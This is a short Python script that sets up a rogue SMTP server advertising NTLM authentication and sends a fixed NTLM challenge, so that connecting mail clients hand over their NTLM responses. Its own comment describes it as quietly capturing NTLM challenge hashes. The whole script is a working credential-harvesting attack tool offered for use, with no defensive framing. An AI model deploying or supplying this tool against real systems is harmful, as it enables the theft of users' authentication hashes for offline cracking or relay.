#smtp_ntlm capture script attempts to quietly catch NTLM Challenge hashes over SMTP

import socket
from time import sleep

s = socket.socket()
host = "127.0.0.1"
port = 25
s.bind((host,port))
s.listen(0)

c, addr = s.accept()
print("Connection accepted from " + repr(addr[1]))

def send(arg1, arg2):
	arg1.send(arg2)
	print(arg2)
	sleep(0.5)


send(c, "220  XXXXXXXXXXX-SMTP-IP\r\n")
print repr(addr[1]) + ": " + c.recv(1026)

send(c, "250-XXXXXXXXXXX Hello\r\n250-AUTH GSSAPI NTLM\r\n250 OK\r\n")
print repr(addr[1]) + ": " + c.recv(1026)

#Challenge: 0x8877665544332211
send(c, "334 TlRMTVNTUAACAAAAFgAWADgAAAA1goriESIzRFVmd4gAAAAAAAAAAGwAbABOAAAABQLODgAAAA9FAFgAQwBIAC0AQwBMAEkALQA2ADYAAgAWAEUAWABDAEgALQBDAEwASQAtADYANgABABYARQBYAEMASAAtAEMATABJAC0ANgA2AAQAFgBlAHgAYwBoAC0AYwBsAGkALQA2ADYAAwAWAGUAeABjAGgALQBjAGwAaQAtADYANgAAAAAA\r\n")

print repr(addr[1]) + ": " + c.recv(1026)